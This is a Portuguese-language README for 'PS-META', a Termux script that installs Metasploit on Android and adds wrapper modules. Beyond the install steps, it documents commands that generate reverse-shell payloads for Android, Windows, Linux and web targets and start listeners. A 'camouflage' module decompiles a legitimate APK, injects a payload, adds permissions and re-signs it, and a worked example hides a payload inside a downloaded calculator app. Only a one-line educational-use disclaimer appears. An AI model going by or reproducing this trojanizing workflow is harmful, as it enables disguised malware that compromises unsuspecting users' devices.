┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   ██████╗ ███████╗    ███╗   ███╗███████╗████████╗ █████╗       │
│   ██╔══██╗██╔════╝    ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗      │
│   ██████╔╝███████╗    ██╔████╔██║█████╗     ██║   ███████║      │
│   ██╔═══╝ ╚════██║    ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║      │
│   ██║     ███████║    ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║      │
│   ╚═╝     ╚══════╝    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝      │
│                                                                 │
│                    ┌─────────────────────┐                      │
│                    │      P S - M E T A  │                      │
│                    │  Metasploit v3.0    │                      │
│                    └─────────────────────┘                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

# 🛡️ PS-META - METASPLOIT INSTALLER

**Desenvolvedor:** Peek (Gilberto Martins)  
**Equipe:** PeekSecurity  

---

## 📋 ÍNDICE

- [Sobre o Projeto](#-sobre-o-projeto)
- [Requisitos](#-requisitos)
- [Instalação](#-instalação)
- [Comandos Disponíveis](#-comandos-disponíveis)
- [Módulos Especiais](#-módulos-especiais)
- [Exemplos Práticos](#-exemplos-práticos)
- [Estrutura de Diretórios](#-estrutura-de-diretórios)
- [Solução de Problemas](#-solução-de-problemas)
- [Aviso Legal](#-aviso-legal)

---

## 🎯 SOBRE O PROJETO

**PS-META** é um script inteligente e autônomo desenvolvido por **Peek (Gilberto Martins)** e equipe **PeekSecurity** que instala o Metasploit Framework completo no Termux, com correções automáticas para compatibilidade com Android 13/14/15 e módulos exclusivos para agilizar testes de penetração.

### ✨ Diferenciais

| Característica | Descrição |
|----------------|-------------|
| ✅ **100% Autônomo** | Não depende de arquivos externos ou scripts de terceiros |
| 🔧 **Correção Nokogiri** | Patch definitivo que funciona em todas as versões do Ruby |
| 📦 **Módulos Exclusivos** | PS-Payload, PS-Camouflage, PS-Listener, PS-Android |
| 🚀 **Comandos Curtos** | Prefixo `ps-` para acesso rápido |
| 📝 **Logging Completo** | Todos os logs salvos em `~/.ps-meta/` |
| 💾 **Backup Automático** | Configurações anteriores são salvas antes da instalação |

---

## 📱 REQUISITOS

| Item | Especificação |
|------|---------------|
| **Dispositivo** | Android 11 ou superior |
| **Armazenamento** | Mínimo 4GB livre |
| **RAM** | Recomendado 3GB+ |
| **Internet** | Wi-Fi (download ~500MB) |
| **Tempo** | 30-45 minutos |

> ⚠️ **Importante:** O dispositivo não pode ser desligado durante a instalação. Mantenha o Termux em primeiro plano.

---

## ⚡ INSTALAÇÃO

### Passo 1: Preparar o ambiente

```bash
pkg update && pkg upgrade -y
pkg install git -y
```

### Passo 2: Baixar o instalador

```bash
git clone https://github.com/peeksecurity/ps-meta.git
cd ps-meta
chmod +x ps-meta.sh
```

### Passo 3: Executar a instalação

```bash
./ps-meta.sh
```

### Passo 4: Finalizar

```bash
source ~/.bashrc
ps-msfconsole
```

---

## 🛠️ COMANDOS DISPONÍVEIS

### Comandos Principais

```bash
ps-msfconsole     # Inicia o Metasploit Framework
ps-msfvenom       # Gerador de payloads
ps-listener       # Inicia listener rápido
```

### Módulo PS-Payload

```bash
ps-payload android 192.168.1.100 4444
ps-payload windows 10.0.0.5 8080
ps-payload linux 192.168.1.100 4444
ps-payload web 192.168.1.100 4444
ps-payload list
```

### Módulo PS-Camouflage

```bash
ps-camouflage bind payload.apk legitimo.apk
ps-camouflage info app.apk
ps-camouflage sign app.apk
```

### Módulo PS-Android

```bash
ps-android create 192.168.1.100 4444
ps-android camuflage jogo.apk
```

### Aliases

```bash
ps-msf
ps-start
ps-gen
ps-hide
ps-kit
```

---

## 📦 MÓDULOS ESPECIAIS

### 🔹 PS-Payload

```bash
ps-payload android 192.168.1.100 4444
```

---

### 🔹 PS-Camouflage

Processo:
1. Descompila os APKs
2. Injeta o payload
3. Adiciona permissões
4. Recompila e assina
5. Gera APK camuflado

---

### 🔹 PS-Listener

```bash
ps-listener 4444
```

---

### 🔹 PS-Android

```bash
ps-android create 192.168.1.100 4444
```

---

## 📝 EXEMPLOS PRÁTICOS

### Exemplo Android

```bash
ps-payload android 192.168.1.100 4444
ps-listener 4444
```

---

### Exemplo Camuflagem

```bash
wget https://example.com/calculadora.apk
ps-payload android 192.168.1.100 4444
ps-camouflage bind ~/.ps-meta/payloads/*.apk calculadora.apk
```

---

## 📁 ESTRUTURA DE DIRETÓRIOS

```
~/.ps-meta/
├── logs/
├── backups/
├── payloads/
├── apks/
└── temp/
```

---

## 🔧 SOLUÇÃO DE PROBLEMAS

### Espaço insuficiente

```bash
pkg clean
df -h /data
```

### Falha no Ruby

```bash
rm -rf $PREFIX/lib/ruby/*
./ps-meta.sh
```

### PostgreSQL não inicia

```bash
rm -rf $PREFIX/var/lib/postgresql
ps-msfdb reinit
```

---

## ⚖️ AVISO LEGAL

Uso educacional apenas. Utilize somente em ambientes autorizados.

---

## 📞 CRÉDITOS

Peek (Gilberto Martins)  
PeekSecurity

---

🛡️ PS-META - PeekSecurity
